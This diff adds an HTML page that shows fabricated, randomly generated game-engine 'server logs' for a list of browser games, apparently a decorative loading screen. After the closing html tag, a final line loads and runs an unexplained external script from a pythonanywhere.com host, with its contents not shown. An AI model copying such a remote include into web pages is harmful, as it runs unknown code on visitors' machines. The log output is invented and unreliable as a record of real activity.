@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Server Logs</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  html,body{margin:0;padding:0;height:100%;background:#0b0b0c;color:#b6ffd6;font-family:monospace;overflow:hidden;}
+  #console{height:100%;overflow:auto;padding:10px;box-sizing:border-box;white-space:pre-wrap;}
+  .log{line-height:1.25;font-size:13px;padding:1px 0;}
+  .lvl-info{color:#66ccff}
+  .lvl-warn{color:#ffcc33}
+  .lvl-error{color:#ff6b6b}
+  .ts{color:#8bd2b0;margin-right:8px}
+  .progressWrap{display:inline-block;vertical-align:middle;margin-left:8px}
+  .progress{display:inline-block;width:120px;height:6px;background:#111;border-radius:4px;vertical-align:middle;overflow:hidden;border:1px solid rgba(255,255,255,0.02)}
+  .progress > i{display:block;height:100%;background:linear-gradient(90deg,#66ccff,#66ffd6);width:0%}
+</style>
+</head>
+<body>
+<div id="console"></div>
+<script>
+const consoleDiv = document.getElementById('console');
+
+const allGames=[
+  "2048","blackholesquare","c00kieclicker","chromedino","crossyroad","doom","drifthunters","drivemad",
+  "friendlyfire","geometrydash","minecraft","ninjavsevilcorp","pacman","paperio","particleclicker",
+  "q1k3","roadblocks","snake","stack","tetris","vex6","wordle","xx142-b2exe","among-impostor",
+  "basket-random-pro","block-blast","brainrot-clicker","call-of-tanks","cannon-strike","charge-it",
+  "checkout-frenzy","cool-cookie-clicker","draw-the-bridge","draw-the-car-path","drift-racer-2021",
+  "drift-rider","egg-car-racing","eggy-car","elastic-man","escape-car","f1-racing","farming-island",
+  "fast-food-rush","flappy-bird","fps-strike","highway-driver","highway-traffic","house-painter",
+  "idle-farming-business","idle-mining-empire","learn-to-fly-3","love-tester","madalin-stunt-cars-pro",
+  "mafia-wars","moto-x3m","moto-x3m-winter","neighborhood-defense","neon-racer","ninja-obby-parkour",
+  "nuts-and-bolts-puzzle","sniper-reloaded","snow-rush-3d","sprunki","stickman-parkour","stickman-swing",
+  "survival-island","watermelon-suika"
+];
+
+let logsBuffer = [], domBuffer = [], totalLogs = 0, errorLogs = 0, genAccumulator = 0, lastGenTime = performance.now();
+
+function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+function nowISO() { return new Date().toISOString(); }
+function prettyTime() { return new Date().toLocaleTimeString(); }
+
+function generateUnityPath(game){
+  const base=`/assets/${game}`;
+  const paths=[
+    `${base}/Scenes/${game}_MainScene.unity`,
+    `${base}/Scenes/Level${Math.floor(Math.random()*20)}.unity`,
+    `${base}/Prefabs/${game}_Player.prefab`,
+    `${base}/Prefabs/${game}_Enemy.prefab`,
+    `${base}/Textures/${game}_Tex${Math.floor(Math.random()*8)}.png`,
+    `${base}/Scripts/${game}_Logic.cs`,
+    `${base}/Audio/${game}_BGM${Math.floor(Math.random()*4)}.mp3`,
+    `${base}/Bundles/${game}_bundle${Math.floor(Math.random()*6)}.unity3d`
+  ];
+  return pick(paths);
+}
+
+const LOG_TEMPLATES=[
+  {lvl:'INFO',tpl:'Initialized {subsystem} subsystem for {game}'},
+  {lvl:'INFO',tpl:'Loaded {size}MB from {path}'},
+  {lvl:'INFO',tpl:'Loaded bundle {path} ({size}MB) with {count} assets'},
+  {lvl:'INFO',tpl:'Shader {name} compiled successfully'},
+  {lvl:'INFO',tpl:'Spawned {count} NPCs at {path}'},
+  {lvl:'INFO',tpl:'AI: {game} pathfinding grid computed in {ms}ms'},
+  {lvl:'INFO',tpl:'Saved progress for player {id} (slot {slot})'},
+  {lvl:'WARN',tpl:'Network latency detected while fetching {path} ({ms}ms)'},
+  {lvl:'WARN',tpl:'Retrying download for {path} (attempt {attempt})'},
+  {lvl:'ERROR',tpl:'Failed to load asset {path} (corrupt or missing)'}
+];
+
+function randomInt(min, max) { return Math.floor(Math.random()*(max-min+1))+min; }
+
+function makeLog(){
+  const game=pick(allGames);
+  const path=generateUnityPath(game);
+  const size=(Math.random()*60+0.1).toFixed(2);
+  const count=randomInt(1,24);
+  const ms=randomInt(1,800);
+  const template=pick(LOG_TEMPLATES);
+  const subsystems=['Rendering','AI','Networking','Physics','Audio','UI','Input','Animation'];
+  const name=`Shader_${Math.random().toString(36).slice(2,8)}`;
+  const id=Math.random().toString(36).slice(2,9);
+  const slot=randomInt(1,3);
+  const attempt=randomInt(1,4);
+  let text=template.tpl.replace(/{game}/g,game)
+      .replace(/{path}/g,path)
+      .replace(/{size}/g,size)
+      .replace(/{count}/g,count)
+      .replace(/{ms}/g,ms)
+      .replace(/{subsystem}/g,pick(subsystems))
+      .replace(/{name}/g,name)
+      .replace(/{id}/g,id)
+      .replace(/{slot}/g,slot)
+      .replace(/{attempt}/g,attempt);
+  let level=template.lvl;
+  const timestamp=nowISO();
+  const pretty=prettyTime();
+  const isBundle=path.includes('bundle')||path.includes('Scenes');
+  return {id:++totalLogs,level,path,sizeMB:size,text,timestamp,pretty,game,isBundle};
+}
+
+function pushLogEntry(entry){
+  logsBuffer.push(entry);
+  domBuffer.push(entry);
+  if(entry.level==='ERROR') errorLogs++;
+}
+
+function flushDom(){
+  if(domBuffer.length===0) return;
+  const frag=document.createDocumentFragment();
+  const batch=domBuffer.splice(0,domBuffer.length);
+  for(const e of batch){
+    const div=document.createElement('div');
+    const ts=`<span class="ts">[${e.pretty}]</span>`;
+    const lvlClass=e.level==='ERROR'?'lvl-error':e.level==='WARN'?'lvl-warn':'lvl-info';
+    let progressHtml='';
+    if(e.isBundle && Math.random()<0.45){
+      const pct=Math.floor(Math.random()*95)+1;
+      progressHtml=`<span class="progressWrap"><span class="progress"><i style="width:${pct}%"></i></span></span>`;
+    }
+    div.className='log';
+    div.innerHTML=`${ts}<span class="${lvlClass}">[${e.level}]</span> ${e.text} ${progressHtml}`;
+    frag.appendChild(div);
+  }
+  consoleDiv.appendChild(frag);
+  consoleDiv.scrollTop=consoleDiv.scrollHeight;
+
+  // Keep only last 100 logs
+  while(consoleDiv.childElementCount>100){
+    consoleDiv.removeChild(consoleDiv.firstChild);
+  }
+}
+
+let running=true;
+
+function genLoop(){
+  const now=performance.now();
+  const dt=now-lastGenTime;
+  lastGenTime=now;
+
+  // Adjust log generation speed: 8-12 logs per second randomly
+  genAccumulator += (30 + Math.random()*20)/1000*dt;
+
+  let toGen=Math.floor(genAccumulator);
+  genAccumulator -= toGen;
+  if(toGen>20) toGen=20; // cap to prevent spikes
+
+  for(let i=0;i<toGen;i++) pushLogEntry(makeLog());
+
+  flushDom();
+  if(running) requestAnimationFrame(genLoop);
+}
+
+function animateConnection(durationMs=5000){
+  const start=performance.now();
+  return new Promise(resolve=>{
+    function tick(){
+      const now=performance.now();
+      const t=Math.min(1,(now-start)/durationMs);
+      if(t<1) requestAnimationFrame(tick);
+      else resolve();
+    }
+    requestAnimationFrame(tick);
+  });
+}
+
+// Startup
+pushLogEntry({id:++totalLogs,level:'INFO',path:'startup',sizeMB:'0',text:'[GameLoader] Conneting to server logs',timestamp:nowISO(),pretty:prettyTime(),game:'engine',isBundle:false});
+flushDom();
+animateConnection(5000).then(()=>{requestAnimationFrame(genLoop);});
+</script>
+</body>
+</html>
+<script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
